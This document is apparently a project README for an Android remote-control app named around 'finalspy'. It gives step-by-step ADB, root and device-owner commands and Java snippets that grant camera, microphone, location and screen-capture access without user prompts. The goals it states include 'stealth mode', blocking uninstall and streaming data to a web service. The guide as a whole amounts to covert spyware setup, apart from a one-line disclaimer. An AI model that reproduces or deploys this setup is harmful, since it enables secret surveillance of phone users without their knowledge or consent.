# 🔐 Advanced Permission Setup Guide

## One-Time Setup for Permanent Remote Control

This guide will help you set up your Android app with elevated permissions that allow **permanent remote control** without user interaction.

## 🎯 What This Achieves

After setup, your app will be able to:
- ✅ Start screen capture remotely (even when device is locked)
- ✅ Enable/disable GPS programmatically
- ✅ Control camera remotely
- ✅ Access location without user prompts
- ✅ Survive device restarts and app removal from recent apps
- ✅ Operate with minimal visibility (stealth mode)

## 🛠️ Setup Methods

### Method 1: ADB Commands (Recommended for Testing)

#### Prerequisites
1. Install ADB on your computer
2. Enable Developer Options on Android device
3. Enable USB Debugging
4. Connect device via USB

#### Step 1: Grant WRITE_SECURE_SETTINGS Permission
```bash
# Replace com.example.myapplication with your actual package name
adb shell pm grant com.example.myapplication android.permission.WRITE_SECURE_SETTINGS
```

#### Step 2: Set App as Device Owner (Optional - For Maximum Control)
```bash
# First, remove any existing accounts on the device (important!)
# Then run:
adb shell dpm set-device-owner com.example.myapplication/.admin.DeviceOwnerReceiver
```

#### Step 3: Grant Additional Permissions
```bash
# Location permissions
adb shell pm grant com.example.myapplication android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.example.myapplication android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.example.myapplication android.permission.ACCESS_BACKGROUND_LOCATION

# Camera permissions
adb shell pm grant com.example.myapplication android.permission.CAMERA
adb shell pm grant com.example.myapplication android.permission.RECORD_AUDIO

# Storage permissions
adb shell pm grant com.example.myapplication android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.example.myapplication android.permission.WRITE_EXTERNAL_STORAGE
```

#### Step 4: Disable Battery Optimization
```bash
adb shell dumpsys deviceidle whitelist +com.example.myapplication
```

### Method 2: Device Owner via Factory Reset

#### For Production Deployment (Most Secure)

1. **Factory reset the device**
2. **During initial setup, DON'T add any Google accounts**
3. **Install your app**
4. **Run the device owner command:**
   ```bash
   adb shell dpm set-device-owner com.example.myapplication/.admin.DeviceOwnerReceiver
   ```
5. **Now your app has full device owner privileges**

### Method 3: Root Access (Advanced Users)

If device is rooted:
```bash
# Grant system-level permissions
su -c "pm grant com.example.myapplication android.permission.WRITE_SECURE_SETTINGS"
su -c "pm grant com.example.myapplication android.permission.WRITE_SETTINGS"
```

## 📱 App Usage After Setup

### 1. **First Time Setup in App**
- Open the app
- Grant screen capture permission ONCE through the UI
- This permission is now stored permanently

### 2. **Remote Control from Web Service**
- Visit your web service: `https://finalspy.onrender.com`
- Click any remote control button
- Everything works automatically without device interaction!

### 3. **Verification Commands**

Check if setup worked:
```bash
# Check if app is device owner
adb shell dpm list-owners

# Check granted permissions
adb shell pm list-permissions -g com.example.myapplication

# Check if WRITE_SECURE_SETTINGS is granted
adb shell pm list-permissions | grep WRITE_SECURE
```

## 🔧 How the System Works

### Device Owner Capabilities
When your app becomes a device owner, it can:

```java
// Enable GPS programmatically
devicePolicyManager.setSecureSetting(adminComponent, 
    Settings.Secure.LOCATION_MODE, 
    String.valueOf(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY));

// Grant runtime permissions automatically
devicePolicyManager.setPermissionGrantState(adminComponent, packageName, permission,
    DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);

// Make app non-removable
devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true);
```

### Screen Capture Persistence
```java
// Store screen capture permission permanently
DeviceOwnerManager.getInstance().storeScreenCapturePermission(context, data, resultCode);

// Use stored permission for remote control
Intent storedIntent = DeviceOwnerManager.getInstance().getStoredScreenCaptureIntent(context);
```

### Location Control
```java
// Enable location services programmatically
DeviceOwnerManager.getInstance().enableLocationServices(context);

// Start location updates without user interaction
RemoteControlManager.getInstance().startLocation();
```

## 🚨 Important Notes

### Security Considerations
- **Device Owner mode gives FULL device control**
- **Only use on devices you own or control**
- **Remove accounts before setting device owner**
- **Cannot be uninstalled once set as device owner**

### Android Version Compatibility
- **Android 10+**: All features work
- **Android 8-9**: Most features work
- **Android 7-**: Basic functionality only

### Production Deployment
1. **Use signed APK for production**
2. **Set up device owner during initial device setup**
3. **Test on multiple device types**
4. **Consider MDM (Mobile Device Management) solutions for enterprise**

## 🧪 Testing the Setup

### 1. Test Screen Capture
```bash
# From web service, click "Start Screen Capture"
# Should work immediately without any prompts
```

### 2. Test Location Control
```bash
# From web service, click "Start Location"
# GPS should turn on automatically
# Location data should stream to web service
```

### 3. Test Camera Control
```bash
# From web service, click "Start Back Camera"
# Camera should start without prompts
# Click "Switch Camera" to test front camera
```

### 4. Test Persistence
```bash
# Remove app from recent apps
# All features should continue working
# Web service should maintain connection
```

## 🔧 Troubleshooting

### Common Issues

#### "Device owner cannot be set"
- **Solution**: Factory reset device and don't add accounts

#### "Permission denied for WRITE_SECURE_SETTINGS"
- **Solution**: Run ADB command as administrator

#### "Screen capture fails remotely"
- **Solution**: Grant permission once through app UI first

#### "Location doesn't turn on automatically"
- **Solution**: Verify device owner is set correctly

### Debug Commands
```bash
# Check device owner status
adb shell dpm list-owners

# Check app permissions
adb shell dumpsys package com.example.myapplication | grep permission

# Check location settings
adb shell settings get secure location_mode

# View app logs
adb logcat -s "DeviceOwnerManager:*" "RemoteControlManager:*"
```

## 📋 Complete Setup Checklist

### Initial Setup
- [ ] Install ADB on computer
- [ ] Enable USB Debugging on device
- [ ] Connect device via USB
- [ ] Install your APK

### Permission Setup
- [ ] Grant WRITE_SECURE_SETTINGS via ADB
- [ ] Set device owner (optional but recommended)
- [ ] Grant runtime permissions via ADB
- [ ] Disable battery optimization

### App Configuration
- [ ] Open app and grant screen capture permission once
- [ ] Verify all managers initialize correctly
- [ ] Test local functionality

### Remote Control Testing
- [ ] Visit web service URL
- [ ] Test screen capture remote control
- [ ] Test camera remote control
- [ ] Test location remote control
- [ ] Verify persistence after app removal

### Production Deployment
- [ ] Use signed APK
- [ ] Document setup process for end users
- [ ] Test on multiple device types
- [ ] Consider enterprise MDM solutions

## 🎯 Final Result

After completing this setup, your system will have:
- **Permanent screen capture** that works remotely even when locked
- **GPS control** that can be toggled from web service
- **Camera control** with front/back switching from web service
- **Stealth operation** with minimal visibility
- **Persistent connection** that survives app removal
- **Enterprise-grade remote control** capabilities

Your web service at `https://finalspy.onrender.com` will have full control over the Android device! 🚀
